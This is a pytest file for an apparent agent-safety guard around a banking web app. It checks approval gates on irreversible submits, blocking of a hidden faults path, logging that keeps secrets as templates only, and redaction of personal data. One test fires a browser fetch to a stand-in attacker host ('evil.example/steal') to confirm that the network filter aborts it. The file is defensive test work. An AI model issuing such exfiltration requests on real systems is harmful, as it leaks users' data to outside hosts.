"""GuardedSurface against the real app in headless Chromium."""

import json

import pytest

from cua.policy.errors import ApprovalDenied, PolicyBlocked
from cua.policy.guard import AutoApproveForTests
from cua.surface.locators import TableCell, TargetSpec
from tests.surface.helpers import MAIN, SUBMIT, login, open_detail, open_review

SECRET_TEMPLATE = "{{secret:BANK_OPERATOR_PASS}}"
MAIN_BALANCE = TargetSpec(frame=MAIN, description="Share Savings balance", strategies=[
    TableCell(section_header="ACCOUNTS", row_key="Share Savings", column_header="BALANCE")])


@pytest.fixture(autouse=True)
def _operator_secret(monkeypatch):
    monkeypatch.setenv("BANK_OPERATOR_PASS", "demo-pass-123")


def events(run) -> list[dict]:
    return [json.loads(line) for line in run.events_path.read_text().splitlines()]


def test_submit_denied_by_default_and_nothing_is_created(app_a, make_guarded):
    g = make_guarded()
    login(g.surface, app_a, password=SECRET_TEMPLATE)
    open_review(g.surface)
    assert g.surface.page_contains("OPEN SUB-ACCOUNT - REVIEW", MAIN)

    with pytest.raises(ApprovalDenied) as exc:
        g.surface.click(SUBMIT)
    assert exc.value.decision.rule_id == "subacct-submit"
    assert g.surface.page_contains("OPEN SUB-ACCOUNT - REVIEW", MAIN)
    assert not g.surface.page_contains("SUB-ACCOUNT OPENED", MAIN)

    evs = events(g.run)
    approval = [e for e in evs if e["type"] == "approval_result"]
    assert len(approval) == 1 and approval[0]["data"]["approved"] is False
    assert not any(e["type"] == "action" and "SUBMIT" in e["data"]["action"] for e in evs)


def test_submit_with_approval_succeeds(app_a, make_guarded):
    approver = AutoApproveForTests()
    g = make_guarded(approver=approver)
    login(g.surface, app_a, password=SECRET_TEMPLATE)
    open_review(g.surface)
    result = g.surface.click(SUBMIT)
    assert result.policy.risk == "irreversible" and result.policy.verdict == "require_approval"
    assert g.surface.page_contains("SUB-ACCOUNT OPENED — CONFIRMATION NO. MC-", MAIN)
    assert [d.rule_id for d, _ in approver.requests] == ["subacct-submit"]


def test_replay_with_both_approvals_needs_no_approver(app_a, make_guarded):
    g = make_guarded(mode="replay", artifact_approved=True, step_approved=True)  # DenyAll
    login(g.surface, app_a, password=SECRET_TEMPLATE)
    open_review(g.surface)
    assert g.surface.click(SUBMIT).policy.verdict == "allow"
    assert g.surface.page_contains("SUB-ACCOUNT OPENED", MAIN)


def test_navigating_to_fault_plane_is_blocked(app_a, make_guarded):
    g = make_guarded()
    with pytest.raises(PolicyBlocked) as exc:
        g.surface.open(f"{app_a}/__faults")
    assert exc.value.decision.rule_id == "blocked_path"
    decisions = [e for e in events(g.run) if e["type"] == "policy_decision"]
    assert decisions[-1]["data"]["decision"]["verdict"] == "block"


def test_network_filter_aborts_foreign_requests_but_app_frames_load(app_a, make_guarded):
    g = make_guarded()
    login(g.surface, app_a, password=SECRET_TEMPLATE)  # frameset + 3 frames load fine
    page = g.surface.inner.page
    outcome = page.evaluate(
        "() => fetch('http://evil.example:9/steal?x=1').then(() => 'ok', () => 'failed')")
    assert outcome == "failed"
    outcome = page.main_frame.child_frames[0].evaluate(
        "() => fetch('/__faults').then(() => 'ok', () => 'failed')")
    assert outcome == "failed"
    blocked = [e["data"] for e in events(g.run) if e["type"] == "network_blocked"]
    assert [(b["url"].split("?")[0], b["decision"]["rule_id"]) for b in blocked] == [
        ("http://evil.example:9/steal", "origin_not_allowlisted"),
        (f"{app_a}/__faults", "blocked_path"),
    ]


def test_secret_fill_logs_template_only(app_a, make_guarded):
    g = make_guarded()
    login(g.surface, app_a, password=SECRET_TEMPLATE)
    fills = [e["data"] for e in events(g.run)
             if e["type"] == "action" and e["data"]["action"].startswith("fill")]
    assert [f["value"] for f in fills] == ["demo_operator", SECRET_TEMPLATE]


def test_observation_and_reads_are_redacted(app_a, make_guarded):
    g = make_guarded()
    login(g.surface, app_a, password=SECRET_TEMPLATE)
    open_detail(g.surface, "12345")
    obs = g.surface.observe()
    dumped = obs.model_dump_json()
    for raw in ("SAMPLE, JOHN Q", "900-12-3456", "100 TEST LANE", "555-0101",
                "john.sample@example.com"):
        assert raw not in dumped
    assert "$12,345.67" in dumped
    assert g.surface.read_text(MAIN_BALANCE) == "$12,345.67"
    ssn_ref = next(e.ref for e in obs.elements if e.name == "[REDACTED:SSN]")
    target = g.surface.describe(ssn_ref)
    assert [s.kind for s in target.strategies] == ["css_path"]  # value-bearing ones dropped
    assert "900-12-3456" not in target.model_dump_json()
